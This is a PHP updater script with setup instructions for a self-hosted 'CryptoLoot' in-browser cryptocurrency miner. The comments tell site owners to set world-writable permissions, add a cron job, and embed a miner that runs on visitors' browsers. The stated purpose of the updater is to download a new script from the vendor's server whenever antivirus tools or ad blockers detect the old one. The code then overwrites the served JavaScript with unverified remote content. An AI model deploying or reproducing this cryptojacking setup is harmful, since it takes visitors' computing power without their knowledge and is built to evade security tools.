<?php
/* CryptoLoot Self-Hosted Library */

/*********************************
Instructions:
1) Extract the directory contents of this project to your websites root directory
2) Make sure to install php-curl extension on your server if it does not exist (centos: yum install php-curl, debian: apt-get install php-curl)
3) Change the permissions of these two files to 777 so they can be overwritten on update: chmod 777 lib/crypta.js  lib/version.txt
4) Install the cron to check for updates once every 12 hours:
On your server, type crontab -e and put this line at the bottom: */
// Place the following in your cronjob file:  0 */12 * * * php /var/www/html/website/updater.php >> /var/www/html/website/cl_log.txt
/*
 This will check for the latest script update on CryptoLoot servers, and pull the
 latest script. Whenever old scripts are being detected by A/V or Adblockers,
 there will be a new script automatically downloaded to your server.

5) Run 'php updater.php' to check for any errors in updating, and update any possibly outdated scripts before the next step
6) Add the script to your website:
<script src="lib/crypta.js"></script>
<script>
            var miner=new CRLT.Anonymous('YOUR_PUBLIC_KEY', {
                threads:4,autoThreads:false,throttle:0.2,
            });
        miner.start();
</script>
7) Done! (Make sure you changed YOUR_PUBLIC_KEY with your public site key obtained from https://crypto-loot.org dashboard.
*********************************/

$updateTime = time();
$updater = "https://crypto-loot.org/checkupdate";
$versionFile = "lib/cl_version.txt";
$myfile = fopen($versionFile, "r") or die("Unable to open file!");
$version = (int)fread($myfile,filesize($versionFile));
fclose($myfile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $updater);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$serverVersion = (int)curl_exec($ch);
curl_close($ch);

if($serverVersion>$version){ // Update
  $script1 = file_get_contents("https://crypto-loot.org/selfhosted/crypta.js");
  try {
    file_put_contents("lib/crypta.js", $script1);
    $editVersion=fopen($versionFile, "w");
    fwrite($editVersion, $serverVersion);
    fclose($editVersion);
    echo "{$updateTime} - Updated from version: {$version} to {$serverVersion}\r\n";
  } catch (Exception $e) {
    echo $updateTime . ' - Error: ',  $e->getMessage(), "\r\n";
  }
} else{
  printf("{$updateTime} - Version is already up-to-date.\r\n");
}


?>
